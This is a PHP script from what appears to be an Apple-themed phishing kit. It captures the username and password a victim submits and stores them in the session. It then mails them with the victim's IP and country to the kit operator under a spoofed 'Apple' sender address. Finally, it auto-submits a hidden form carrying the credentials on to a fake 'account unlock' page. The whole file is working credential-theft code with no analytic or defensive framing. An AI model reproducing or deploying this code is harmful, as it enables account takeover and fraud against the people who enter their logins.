<?php @error_reporting(0);
include('../../detect.php');
require "session_protect.php";
require "functions.php";
$_SESSION['user'] = $_POST['user']; 
$_SESSION['pass'] = $_POST['pass']; 

$email	= $_POST['user'];
$password = $_POST['pass'];

include '../../messageapp.php';
include '../../setoransnsv.php';
$subject = "Apple [ " . $nama_negara . " - " . $ip . " ]";
$headers = "From: Apple <k1r4@snsv-crew.id>";
mail($Your_Email, $subject, $message, $headers);

?>
<form action='../locked.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' name='frm'>
<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
</form>
<script language="JavaScript">
document.frm.submit();
</script>